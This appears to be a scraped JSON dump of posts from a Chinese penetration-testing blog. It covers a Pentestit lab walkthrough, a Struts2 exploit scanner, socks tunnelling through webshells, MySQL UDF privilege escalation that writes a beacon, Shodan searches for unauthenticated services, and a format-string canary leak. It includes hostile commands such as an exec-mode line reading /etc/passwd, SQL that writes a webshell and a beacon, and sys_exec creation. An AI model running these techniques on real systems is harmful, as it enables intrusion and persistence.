= IpAddress: 172.16.50.11iso.3.6.1.2.1.3.1.1.3.2.1.172.16.50.20 = IpAddress: 172.16.50.20iso.3.6.1.2.1.3.1.1.3.3.1.172.16.60.2 = IpAddress: 172.16.60.2iso.3.6.1.2.1.3.1.1.3.3.1.172.16.60.3 = IpAddress: 172.16.60.3iso.3.6.1.2.1.3.1.1.3.3.1.172.16.60.4 = IpAddress: 172.16.60.4iso.3.6.1.2.1.3.1.1.3.3.1.172.16.60.5 = IpAddress: 172.16.60.5 扫描一下端口开放 1234567891011121314151617181920212223242526272829PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 62Nmap scan report for 172.16.60.3Host is up, received user-set (0.50s latency).Scanned at 2020-01-07 20:16:25 EST for 126sNot shown: 999 filtered portsReason: 999 no-responsesSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 62Nmap scan report for 172.16.60.4Host is up, received user-set (0.62s latency).Scanned at 2020-01-07 20:16:25 EST for 129sNot shown: 999 filtered ports Reason: 999 no-responses Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 62Nmap scan report for 172.16.60.5Host is up, received user-set (0.58s latency).Scanned at 2020-01-07 20:16:25 EST for 127sNot shown: 999 filtered portsReason: 999 no-responsesSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 62 仅开放ssh服务，利用之前收集到的用户名爆破一波 同一口令可以登录这四台服务器，挨个儿翻一遍（估计作者为了增加难度，BAN了find大法，在其中一台/opt目录下发现t@ken文件，( ╯□╰ )），继续信息收集，发现ssh密钥对，一个dump文件，全都下载回本地。（PS，作者喜欢在/opt下塞东西，从之前放token的位置可以看出来）file命令看一下dump文件，是一个pcap数据报文文件，先strings+grep找一下token 看样子像一个web登录请求，用wireshark继续分析改文件 Git对应咱们收集的域名列表，172.16.0.21是git服务器，这个登录密码应该就是Git登录账密，拿去登录成功 查看提交记录，发现token Certificate这个题目最早出现是在Mail那一关，从邮箱下载回来一个Certificate文件，当时没太懂python的Module怎么逆，群友提示先别硬刚，就放一边了，原来在仓库有源码。 ````` from hashlib import md5from base64 import b64decodefrom base64 import b64encodefrom Crypto.Cipher import AESfrom Crypto.Random import get_random_bytesfrom Crypto.Util.Padding import pad, unpad certif = “””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“”” cyphered = “””9FRznJq2IO9ubbW+MvuwEIf4oS9VlIB/H+ygdD1OZp+/q1AF1bwtHlpP7IqTUrTd””” d = “”” PC10-a=0H !ejkl;F97 fhNjkRc12 DFlT21K54 l(8Ee15AA LC,$T$2I! 1JHG11T12 tJUf24D17 34e6GDHIT“”” class AESCipher: def init(self, key): self.key = md5(key.encode(‘utf8’)).digest() def encrypt(self, data): iv = get_random_bytes(AES.block_size) self.cipher = AES.new(self.key, AES.MODE_CBC, iv) return b64encode(iv + self.cipher.encrypt(pad(data.encode(&apos;utf-8&apos;), AES.block_size))) def decrypt(self, data): raw = b64decode(data) self.cipher = AES.new(self.key, AES.MODE_CBC, raw[:AES.block_size]) return unpad(self.cipher.decrypt(raw[AES.block_size:]), AES.block_size)def find_key(d): d_s = d.split() l = len(d_s) - 1 key = ‘’ for i in range(2): key += d_s[0][i] + d_s[0][l - i] key += d_s[l][l - i] + d_s[l][i] return key def inds(pos): return pos.split(‘,’) def puzzle_assembly(positions): p = positions rs = d.split() token = ‘’ for it in p.split(): sel = inds(it) token = ‘’.join([token, rs[int(sel[0])][int(sel[1])]]) return token def main(): key = find_key(d) poss = AESCipher(key).decrypt(cyphered).decode(‘utf-8’) pwd = input(‘Please, input password:’) passw = puzzle_assembly(poss) if pwd == passw: # print (&apos;KEY in d =&apos;, key) # print (&apos;poss =&apos;, poss) # print (&apos;PASSWORD =&apos;, passw) certificate = AESCipher(passw).decrypt(certif).decode(&apos;utf-8&apos;) print(&apos;Your certificate: \\n%s&apos; % (certificate)) else: print(&quot;Yor password is not correct!&quot;)if name == “main“: main() 程序逻辑也比较简单，运行后接受一个输入密码，如果和```passw```相同，则输出证书，否则退出，这儿直接把程序逻辑改一下，去掉判断，输出key和密钥 ![upload successful](/images/pasted-89.png) key即是这一关的token ##### Terminal-1 既然拿到了一个ssh密钥对，那应该还是找ssh登录利用，从资产表可以看到，目前为止还剩172.16.40.0/24这个子网，直接扫22端口 ![upload successful](/images/pasted-90.png) 果然有一个，用拿到的密钥登录 ![upload successful](/images/pasted-91.png) 在/opt目录下发现token文件 ##### FPM 发现172.16.40.3这个IP对应admin.test.lab，只能通过172.16.40.2访问，这儿用ssh开本地socks代理来扫描172.16.40.3（网络不稳定，且速度慢），也可以直接传一个扫描工具上去扫，但需要注意一点，实验环境会隔一段时间重置，如果还没扫描完重置环境就GG，只能重来。 探测到两个端口 INFO[0000] tcp://172.16.40.3:9000 is alive and reachableINFO[0000] tcp://172.16.40.3:80 is alive and reachable ``` 80端口跑nginx，再加上9000端口，很容易想到fpm上来（如果关注之前漏洞发布的话应该知道这个洞，正好我复现过hhh）","link":"/2020/01/07/Pentestit-Lab-14-Writeup-Walkthrough/"},{"title":"Struts2全漏洞扫描Golang版","text":"STS2G项目地址：https://github.com/x51/STS2GStruts2漏洞测试-Golang版，部分POC参考了众多优秀项目如Struts2-Scan，漏洞测试环境采用vulhub.目前两种模式scan和exec支持：struts2-001struts2-005struts2-007struts2-008struts2-009struts2-012struts2-013struts2-015struts2-016struts2-045struts2-046struts2-048struts2-053struts2-057 开发目的1、适用于命令行下操作，比如webshell下测试内网struts2漏洞.2、可编译Windows/Linux平台可执行文件.3、单文件运行. 使用方法1234567891011121314151617181920D:\\Struts2-Test&gt;ST2SG.exe -hNAME: ST2SG - Struts2 Scanner Written in GolangUSAGE: ST2SG --url http://xxxxxxx.com/test.action --vn 15 --mode scanAUTHOR: x51 &lt;x51enter@gmail.com&gt;COMMANDS: help, h Shows a list of commands or help for one commandGLOBAL OPTIONS: --mode value Specify work mode --vn value Vulnerability number (default: 0) --url value Set target url --cmd value Exec command(Only works on mode exec.) --data value Specific vulnerability packets --help, -h show help (default: false) 默认扫描模式:ST2SG --url http://xxx.com/index.action --mode scan 指定漏洞扫描模式：ST2SG --url http://xxx.com/index.action --vn 15 --mode scan 命令执行模式：ST2SG --url http://xxx.com/index.action --vn 15 --mode exec --cmd &quot;cat /etc/passwd&quot; 自定义参数：基于以上方法，分两种情况，自定义GET参数名，和自定义POST数据包内容，POST方式需要在数据包中指定一下要测试的参数并用fuckit标记出来. 补充1、强烈建议使用vn参数；2、自定义POC只需在utils中修改为自己的即可；3、部分漏洞支持获取webpath，功能函数已经在各自漏洞模块中实现（func GetWebPath），可自行调用；","link":"/2020/01/16/Struts2%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8FGolang%E7%89%88/"},{"title":"Cobalt Strike学习遇到的问题","text":"jad处理class的结果和jd-gui这类工具反编译结果不太一样，cobaltstrike.jar中的同一个class文件结果如下： 回编的时候会报一些奇怪的错误，需要结合jd-gui和jad两者的结果做适当修改，以AggressorClient文件为例： 定位到178行： 尝试将这段for循环替换了一下，不再报错,重新打包后运行正常，修改结果也成功验证。","link":"/2019/02/11/cobalt-strike-study/"},{"title":"ShodanSearch Tips","text":"在Shodan搜索时如何快速获取暴漏的未授权访问服务首先熟悉各类服务在登陆成功时会返回的banner信息，比如ftp匿名登陆成功： 那么以关键字”230 Login successful”在shodan搜索： 共计197917条ftp未授权（匿名登陆）主机。举一反一观察redis未授权登陆后banner信息： 搜索关键字redis_version: 其他服务发现方式同理，大概总结流程：1、分析未授权服务特征（banner信息）2、选取keywords（如ftp的230 Login successful）3、shodan获取结果 shodan可挖掘信息远不止此，此处算抛砖引玉数据库、工控设备，etc 附：未授权服务利用可参考https://xz.aliyun.com/t/2320这篇文章。","link":"/2019/05/30/shodan-search-tips/"},{"title":"博客迁移记录","text":"update：2019-05-13 删除live2d插件； 12npm uninstall hexo-helper-live2dhexo clean update：2019-02-26 配置新环境： 12345git config --global user.name \"yourgithubname\"git config --global user.email \"yourgithubemail\"ssh-keygen -t rsa -C \"youremail\"cat .ssh/xxx.pub (配置到github账户上)ssh -T git@github.com 123# Using Ubuntucurl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -sudo apt-get install -y nodejs 注：网上教程大部分是直接用apt安装nodejs，实测在ubuntu18.04x64系统下会失败。 1sudo npm install hexo-cli -g 博客备份目录下执行：npm install","link":"/2019/02/26/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E8%AE%B0%E5%BD%95/"},{"title":"安全测试中如何处理前端加密？","text":"在渗透测试过程中难免会遇到很多参数前端加密处理的情况，对我们接下来Fuzz、爆破/注入等操作引入很多麻烦，结合之前遇到的几种场景，整理总结了以下解决方法，常见场景如：1、遇到一个SQL注入，但是注入参数被魔改base64了，我们需要写tamper处理payload，如何高效处理？2、请求带一个防重放攻击的校验hash，该hash是开发者自定义加密算法生成的，如何分析并达到批量目的？3、… 1、execjs12345678910&gt;&gt;&gt; import execjs&gt;&gt;&gt; execjs.eval(\"'red yellow blue'.split(' ')\")['red', 'yellow', 'blue']&gt;&gt;&gt; ctx = execjs.compile(\"\"\"... function add(x, y) {... return x + y;... }... \"\"\")&gt;&gt;&gt; ctx.call(\"add\", 1, 2)3 某些情况下用execjs不可以直接调用，会报一个无效变量的错误，猜测应该是js文件中使用了匿名函数的原因？需要手工处理一下js代码，具体技术细节未深入了解。 2、Selenium常见的高级爬虫环境Python + Selenium + ChromeDriver，基本上浏览器能做的它都可以做（其实就是一个浏览器…）,环境配置也比较简单，于是写了个简单的验证程序： 看起来有点笨重，也有点大材小用的感觉。 3、js2py顾名思义，js代码转python代码，官方的介绍： 1JavaScript to Python Translator &amp; JavaScript interpreter written in 100% pure Python 把负责加密的js扒下来，转为可用的python代码： 123456# this will translate example.js to example.py&gt;&gt;&gt; js2py.translate_file('example.js', 'example.py')# example.py can be now imported and used!&gt;&gt;&gt; from example import example&gt;&gt;&gt; example.someFunction()... 转换结果形式： 1234567891011121314151617from js2py.pyjs import *# setting scopevar = Scope( JS_BUILTINS )set_global_object(var)# Code follows:var.registers([u'$'])@Jsdef PyJsHoistedNonPyName(x, this, arguments, var=var): var = Scope({u'this':this, u'x':x, u'arguments':arguments}, var) var.registers([u'x']) var.get(u'console').callprop(u'log', var.get(u'x'))PyJsHoistedNonPyName.func_name = u'$'var.put(u'$', PyJsHoistedNonPyName)passvar.get(u'$')(Js(u'Hello, World!'))pass 直接导入即可调用： 1234567891011# sqlmap/tamper/escapequotes.pyfrom lib.core.enums import PRIORITYfrom jsfile import jsfile__priority__ = PRIORITY.LOWESTdef dependencies(): passdef tamper(payload, **kwargs): return jsfile.encMe(payload) jsfile是js2py.translate_file的结果。 4、jsEncrypterjsEncrypter 是一个处理前端加密非常好用的burp suite插件，该插件使用phantomjs启动前端加密函数对数据进行加密，方便对加密数据输入点进行fuzz，比如可以使用于前端加密传输爆破等场景。GitHub：https://github.com/c0ny1/jsEncrypter详细使用方法参考项目主页，用法比较简单，作者给出一个phantomjs模板： ... /* 1.在这引入实现加密所有js文件,注意引入顺序和网页一致 */ loadScript(&quot;script-1.js&quot;); loadScript(&quot;script-2.js&quot;); loadScript(&quot;script-n.js&quot;); /**********************************************/ ... function jsEncrypt(burp_payload){ var new_payload; /* 2.在这里编写调用加密函数进行加密的代码,并把结果赋值给new_payload */ /*********************************************************/ return new_payload; } ... 第一步从网站前端扒下来包含加密核心代码的js文件，在phantomjs模板文件中引入；第二部处理jsEncrypt函数返回，运行phantomJS.exe encrypt.js，开启插件即可； 总结Burp suite插件能解决的问题首选jsencrypter，如果需要写脚本处理，比如sqlmap的tamper，选js2py！","link":"/2019/02/14/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/"},{"title":"微信小程序测试","text":"小程序抓包低版本Android系统抓包方式和正常的浏览器抓包相同，导入burp证书即可。但在Android7.0+版本即使导入证书也抓不到https包，由于系统证书信任机制原因导致，解决方法：1、使用低版本系统；2、夜神模拟器+Proxifier；Btw：更换burp版本后重新导入一下对应版本的证书文件。 小程序源码每个小程序对应在微信文件目录下存在wxapkg后缀的源码包文件：/data/data/com.tencent.mm/MicroMsg/aaa/appbrand/pkg/bbb.wxapkgaaa是一串hash字符(ID)，bbb对应的每一个小程序，在打开小程序前ls一下，打开后ls一下即可判断对应的包，pull出来。反编译工具：wuWxapkg.js（github） 待补充","link":"/2020/05/13/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/"},{"title":"渗透测试中的Socks代理","text":"比较常见的一种情况，处于内网的机器，只映射一个Web服务到公网，通过Webshell看到的环境其实是在内网，这类目标一般不通外网，Beacon也不会回连，此时需要代理到目标内网环境。 个人常用的工具有两个。 Regeorghttps://github.com/sensepost/reGeorg环境：Python2.7首先需要把目标对应的web脚本上传到服务器，jsp的站传tunnel.jsp，php传tunnel.php，然后在浏览器访问tunnel脚本看能否正常解析 如果出现如上字符串说明可以成功解析，接下来在本地开启代理连接： 如上所示，代理在10086端口开启成功。BTW：遇到WAF检测流量的情况使用Neo-Regeorg。 abpttshttps://github.com/nccgroup/ABPTTS服务端同样上传jsp/aspx代理脚本，访问确认正常解析，返回一个字符串代表成功解析，将端口转发到本地，可以直接使用，以下命令将该内网主机的3389转发到攻击机的33899端口。 1python abpttsclient.py -c webshell/config.txt -u http://xxxxxx.com/abptts.jsp -f 127.0.0.1:33899/127.0.0.1:3389 注：使用之前生成config文件： 1python abpttsfactory.py -c config.txt -o /config/ 如果目标主机是linux，可以先用abptts代理出目标的22端口，然后本地ssh客户端开启隧道进内网，实战中体验较好。(需拿到ssh密码或者开启了公钥登陆) 其他待补充。","link":"/2019/07/31/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84socks%E4%BB%A3%E7%90%86/"},{"title":"温故——MySQL数据库UDF提权","text":"update：2019-05-13 遇到一个案例，在内网扫描到MySQL弱口令（root账户），连接数据库后将beacon以16进制的形式写入到指定目录（目录可通过sqlmap os-shell获得），可在本地MySQL执行： 1select hex(load_file('/root/beacon.exe')) into dumpfile 'root/beacon.txt'; 然后在目标MySQL执行： 1select 0x{beacon.txt} into dumpfile 'C:\\\\path\\\\beacon.exe'; 最后在sqlmap的os-shell上运行beacon即可； 注：通过该方法写入hex数据时注意路径正确，写入文件不易过大，耗时较久； 使用sqlmap也可以实现udf提权，在一定情况下可选； 1sqlmap -d \"mysql://user:pass@192.168.0.1:3306/testdb\" --os-shell 通过执行记录可看到仍然是上传dll文件后创建sys_evel和sys_exec函数来执行系统命令； ====================== 一个PHP站点，安装了phpmyadmin，root口令已拿到，首先想到的是写shell，然后看webshell权限情况是否需要提权。数据库一些基本参数：默认安装位置在C盘program files路径（这个路径普通权限无法写入，后续提权会遇到），猜测网站路径也应该是默认部署，即C:/intpub/wwwroot/，可直接向这个路径写文件验证一下，不过后来手工试了一下phpinfo存在，验证路径正确。 贴一张mysql文件操作的笔记：写webshell： 1select \"...\" intofile \"C:/intpub/wwwroot/shell.php\"; 此处需注意路径中“/”或者“\\\\”才可以，不要直接复制phpinfo中的“\\”。看一下webshell权限：（SeImpersonatePrivilege开启，看了下端口开放情况应当可以用另一种方法提权，暂且放置） UDFUDF即用户自定义函数，一个包含执行函数的动态链接库，这个dll文件（Windows环境）在SQLMAP安装目录有，x86和x64环境各一份 ：需要先做一下解码操作： 1python /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/udf/mysql/windows/32/lib_mysqludf_sys.dll_ 会在同目录生成一份可用dll文件 关于选择平台位数的问题，需要在MySQL中确认： 这儿要以version_compile_os为准，选64位的dll。如果选择错误会报如下错误： 准备好udf64.dll文件之后，上传目录也需要选择正确的路径：1、MySQL&gt;5.1，需要放置在mysql安装目录下的plugin文件夹；2、MySQL&lt;5.1，需要放置在system32目录下查看plugin完整路径：该目录webshell没有写权限，利用MySQL的load_file函数 创建函数sys_exec： 1create function sys_exec returns string soname \"udf64\"; 创建成功之后即可直接select sys_exec来使用； 测试完成之后删除函数，删除dll文件； 1drop function sys_exec;","link":"/2019/02/23/%E6%B8%A9%E6%95%85%E2%80%94%E2%80%94MySQL%E6%95%B0%E6%8D%AE%E5%BA%93UDF%E6%8F%90%E6%9D%83/"},{"title":"钉钉机器人妙用","text":"前不久的一个内部小分享","link":"/2020/04/21/%E9%92%89%E9%92%89%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%A6%99%E7%94%A8/"},{"title":"温故——格式化字符串Leak Canary","text":"PWN入门笔记main函数开启canary时栈分布： 当堆栈向下(低地址)增长时，以FP地址（EBP）为基准，函数参数的偏移量是正值，而局部变量的偏移量是负值 在程序结束处寻找canary的值： 详细过程： 此时edx的值即canary的值： 计算偏移： 读取： 123#./binary_200 %15$xf1339a00","link":"/2019/02/26/%E6%B8%A9%E6%95%85%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2leak-canary/"}],"tags":[],"categories":[]}